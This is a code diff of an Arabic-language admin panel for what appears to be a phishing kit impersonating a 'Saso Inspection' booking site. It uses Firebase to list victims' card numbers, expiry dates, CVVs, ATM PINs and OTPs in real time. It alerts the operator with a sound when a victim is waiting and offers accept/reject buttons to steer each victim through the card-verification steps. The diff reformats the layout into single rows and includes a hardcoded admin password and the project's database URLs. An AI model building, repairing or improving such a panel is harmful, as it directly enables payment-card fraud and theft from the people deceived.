@@ -3,43 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم الذكية - Saso Inspection</title>
+    <title>لوحة التحكم - سطر واحد</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 0; }
-        #adminContent { display: none; }
-        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
-        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
-        .nav-btn.active { background: #ffffff; color: #1e7344; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
-        .container { padding: 15px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #ccc; margin: 0; padding: 0; }
+        .navbar { background: #1e7344; padding: 10px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
+        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 8px 20px; border-radius: 5px; cursor: pointer; }
+        .nav-btn.active { background: white; color: #1e7344; font-weight: bold; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 5px; text-align: center; font-weight: bold; font-size: 14px; }
+        
+        .container { padding: 10px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
 
-        /* تنسيق البيانات */
-        .operation-row { background: #1a1a1a; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; border-right: 8px solid #444; transition: 0.3s; }
-        .customer-name { font-weight: bold; color: #888; font-size: 16px; }
+        /* تنسيق السطر الواحد */
+        .data-header { display: flex; background: #1a1a1a; padding: 10px; border-radius: 5px; margin-bottom: 5px; font-weight: bold; font-size: 12px; color: #888; border-bottom: 2px solid #333; }
+        .data-row { display: flex; align-items: center; background: #161616; padding: 8px 10px; margin-bottom: 4px; border-radius: 4px; border: 1px solid #222; transition: 0.3s; gap: 10px; }
         
-        .data-grid { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 15px; }
-        .info-box { background: #222; border: 1px solid #333; padding: 8px; border-radius: 6px; min-width: 110px; text-align: center; }
-        .info-label { display: block; font-size: 10px; color: #666; margin-bottom: 4px; }
-        .info-value { display: block; font-size: 13px; color: #999; font-weight: bold; }
-        
-        /* حالة التنبيه للبيانات الجديدة فعلاً */
-        .is-new-alert { border-right-color: #28a745 !important; border-color: #28a745 !important; box-shadow: 0 0 15px rgba(40, 167, 69, 0.2); }
-        .is-new-alert .customer-name { color: #28a745; }
-        .is-new-alert .info-value { color: #fff; }
+        /* تقسيم الأعمدة */
+        .col-name { width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-weight: bold; }
+        .col-card { width: 180px; font-family: monospace; letter-spacing: 1px; color: #aaa; }
+        .col-date { width: 80px; text-align: center; }
+        .col-cvv  { width: 60px; text-align: center; }
+        .col-pin  { width: 80px; text-align: center; color: #9c27b0; font-weight: bold; }
+        .col-otp  { width: 100px; text-align: center; color: #2196f3; font-weight: bold; }
+        .col-btns { flex-grow: 1; display: flex; gap: 5px; justify-content: flex-end; }
 
-        /* أزرار التحكم - الافتراضي رمادي مطفي */
-        .actions-area { display: flex; gap: 10px; }
-        .btn { flex: 1; padding: 12px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; background: #333; color: #666; transition: 0.3s; }
-        
-        /* تفعيل الألوان عند وصول تحديث جديد من العميل */
-        .btn-active-green { background: #28a745 !important; color: white !important; }
-        .btn-active-red { background: #dc3545 !important; color: white !important; }
+        /* حالة التنبيه للجديد */
+        .is-new-row { border-color: #28a745 !important; background: #0d2112 !important; color: #fff !important; }
+        .is-new-row .col-card { color: #fff; }
 
-        .status-badge { padding: 4px 10px; border-radius: 10px; font-size: 11px; font-weight: bold; background: #333; color: #888; }
+        /* الأزرار */
+        .btn { padding: 6px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 11px; background: #333; color: #666; transition: 0.2s; }
+        .btn-green.active { background: #28a745 !important; color: white !important; }
+        .btn-red.active { background: #dc3545 !important; color: white !important; }
+
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
     </style>
 </head>
@@ -48,44 +47,45 @@
 <audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
 <div id="loginOverlay">
-    <div style="background:white; padding:30px; border-radius:15px; text-align:center;">
-        <h2 style="color:#1e7344">دخول المهندس حسن</h2>
-        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:10px; margin:10px 0;">
-        <button onclick="checkLogin()" style="width:100%; padding:10px; background:#1e7344; color:white; border:none; border-radius:5px;">دخول</button>
+    <div style="background:white; padding:30px; border-radius:10px; text-align:center;">
+        <h3 style="color:#1e7344; margin:0 0 15px 0;">لوحة تحكم حسن</h3>
+        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:10px; margin-bottom:10px;">
+        <button onclick="checkLogin()" style="width:100%; padding:10px; background:#1e7344; color:white; border:none; border-radius:5px; cursor:pointer;">دخول</button>
     </div>
 </div>
 
 <div id="adminContent">
-    <div class="visitor-counter">المتواجدون حالياً: <span id="onlineCount">0</span> 🌐</div>
+    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
-        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
+        <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
+        <button class="nav-btn" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
         <button class="nav-btn" onclick="logout()" style="background:#000">🚪 خروج</button>
     </div>
+
     <div class="container">
-        <div id="bookingSection" class="tab-content active"><div id="bookingGrid"></div></div>
-        <div id="cardsSection" class="tab-content"><div id="paymentsContainer"></div></div>
+        <div id="cardsSection" class="tab-content active">
+            <div class="data-header">
+                <div class="col-name">الاسم</div>
+                <div class="col-card">رقم البطاقة</div>
+                <div class="col-date">التاريخ</div>
+                <div class="col-cvv">CVV</div>
+                <div class="col-pin">PIN</div>
+                <div class="col-otp">OTP</div>
+                <div class="col-btns">الإجراء</div>
+            </div>
+            <div id="paymentsList"></div>
+        </div>
+        <div id="bookingSection" class="tab-content">
+            <div id="bookingList"></div>
+        </div>
     </div>
 </div>
 
 <script>
-    // تسجيل وقت فتح الصفحة الحالي (بالملي ثانية)
-    const pageLoadTime = Date.now();
-
     function checkSavedLogin() { if (localStorage.getItem("admin_logged_in") === "true") showAdmin(); }
-    function checkLogin() {
-        if(document.getElementById('password').value === "H0987654H") {
-            localStorage.setItem("admin_logged_in", "true");
-            showAdmin();
-        }
-    }
-    function showAdmin() { 
-        document.getElementById('loginOverlay').style.display = 'none'; 
-        document.getElementById('adminContent').style.display = 'block'; 
-        initFirebase(); 
-    }
+    function checkLogin() { if(document.getElementById('password').value === "H0987654H") { localStorage.setItem("admin_logged_in", "true"); showAdmin(); } }
+    function showAdmin() { document.getElementById('loginOverlay').style.display = 'none'; document.getElementById('adminContent').style.display = 'block'; initFirebase(); }
     function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }
-
     function playSound() { document.getElementById('alertSound').play().catch(e => {}); }
 
     function initFirebase() {
@@ -94,9 +94,7 @@
             authDomain: "saso-inspection.firebaseapp.com",
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
             projectId: "saso-inspection",
-            storageBucket: "saso-inspection.appspot.com",
-            messagingSenderId: "1009002235896",
-            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com"
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
@@ -108,88 +106,57 @@
             document.getElementById('onlineCount').innerText = active;
         });
 
-        // استلام البيانات (القديم والجديد)
+        // تحميل البطاقات - سطر واحد
         database.ref('payments').on('child_added', s => {
-            const val = s.val();
-            // تحديد هل البيانات دي "جديدة فعلاً" (وصلت بعد ما فتحنا الصفحة)؟
-            // ملاحظة: لازم تتأكد إن موقعك بيبعت timestamp مع البيانات، لو مش بيبعت هنعتمد على logic الـ child_added بعد الفتح
-            const isFreshEntry = false; // افتراضياً قديم في البداية
-            renderCard(s.key, val, false); 
+            renderRow(s.key, s.val());
         });
 
-        // التحديثات اللحظية (هنا السر: لو العميل غير حاجة وأنت فاتح)
+        // التحديثات الحية (تفعيل التنبيه)
         database.ref('payments').on('child_changed', s => {
             const val = s.val();
-            const row = document.getElementById('p_' + s.key);
+            const row = document.getElementById('row_' + s.key);
             if(row) {
-                // تحديث القيم
-                row.querySelector('.otp-val').innerText = val.otp || '-';
-                row.querySelector('.pin-val').innerText = val.atm_pin || '-';
+                row.querySelector('.col-otp').innerText = val.otp || '-';
+                row.querySelector('.col-pin').innerText = val.atm_pin || '-';
                 
-                // تفعيل التنبيه فقط لو الحالة "انتظار" (يعني العميل لسه شغال)
                 if(val.status && val.status.includes('waiting')) {
-                    row.classList.add('is-new-alert');
-                    row.querySelector('.btn-accept').classList.add('btn-active-green');
-                    row.querySelector('.btn-reject').classList.add('btn-active-red');
-                    playSound(); // التنبيه الصوتي يشتغل فقط عند التغيير الحي
+                    row.classList.add('is-new-row');
+                    row.querySelector('.btn-green').classList.add('active');
+                    row.querySelector('.btn-red').classList.add('active');
+                    playSound();
                 }
-                
-                const badge = document.getElementById('stat_'+s.key);
-                if(val.status === 'accept') { 
-                    badge.innerText = "مقبول ✅"; badge.style.background = "#28a745"; badge.style.color = "white";
-                    resetRowColors(s.key);
-                }
-                if(val.status === 'reject') { 
-                    badge.innerText = "مرفوض ❌"; badge.style.background = "#dc3545"; badge.style.color = "white";
-                    resetRowColors(s.key);
+
+                if(val.status === 'accept' || val.status === 'reject') {
+                    row.classList.remove('is-new-row');
+                    row.querySelector('.btn-green').classList.remove('active');
+                    row.querySelector('.btn-red').classList.remove('active');
                 }
             }
         });
     }
 
-    function renderCard(key, val, shouldAlert) {
-        const container = document.getElementById('paymentsContainer');
-        const row = document.createElement('div');
-        row.className = 'operation-row';
-        row.id = 'p_' + key;
-        
-        // لو الحالة "انتظار" ومفعلين التنبيه (للحالات الجديدة فقط)
-        let alertClass = "";
-        let btnGreen = "";
-        let btnRed = "";
-        
-        row.innerHTML = `
-            <div class="card-header">
-                <span class="customer-name">${val.cardHolder || 'عميل'}</span>
-                <span id="stat_${key}" class="status-badge">انتظار ⏳</span>
-            </div>
-            <div class="data-grid">
-                <div class="info-box"><span class="info-label">رقم البطاقة</span><span class="info-value">${val.cardNumber}</span></div>
-                <div class="info-box"><span class="info-label">التاريخ</span><span class="info-value">${val.expiry}</span></div>
-                <div class="info-box"><span class="info-label">CVV</span><span class="info-value">${val.cvv}</span></div>
-                <div class="info-box"><span class="info-label">OTP</span><span class="info-value otp-val">${val.otp || '-'}</span></div>
-                <div class="info-box"><span class="info-label">PIN</span><span class="info-value pin-val">${val.atm_pin || '-'}</span></div>
-            </div>
-            <div class="actions-area">
-                <button class="btn btn-accept" onclick="updateStat('${key}', 'accept')">قبول</button>
-                <button class="btn btn-reject" onclick="updateStat('${key}', 'reject')">رفض</button>
+    function renderRow(key, val) {
+        const list = document.getElementById('paymentsList');
+        const div = document.createElement('div');
+        div.className = 'data-row';
+        div.id = 'row_' + key;
+        div.innerHTML = `
+            <div class="col-name">${val.cardHolder || 'عميل'}</div>
+            <div class="col-card">${val.cardNumber}</div>
+            <div class="col-date">${val.expiry}</div>
+            <div class="col-cvv">${val.cvv}</div>
+            <div class="col-pin">${val.atm_pin || '-'}</div>
+            <div class="col-otp">${val.otp || '-'}</div>
+            <div class="col-btns">
+                <button class="btn btn-green" onclick="updateStat('${key}', 'accept')">قبول</button>
+                <button class="btn btn-red" onclick="updateStat('${key}', 'reject')">رفض</button>
             </div>
         `;
-        container.prepend(row);
-    }
-
-    function resetRowColors(id) {
-        const row = document.getElementById('p_' + id);
-        if(row) {
-            row.classList.remove('is-new-alert');
-            row.querySelector('.btn-accept').classList.remove('btn-active-green');
-            row.querySelector('.btn-reject').classList.remove('btn-active-red');
-        }
+        list.prepend(div); // الجديد دايماً فوق
     }
 
     function updateStat(id, action) {
         firebase.database().ref('payments/' + id).update({ status: action });
-        resetRowColors(id);
     }
 
     function openTab(evt, name) {
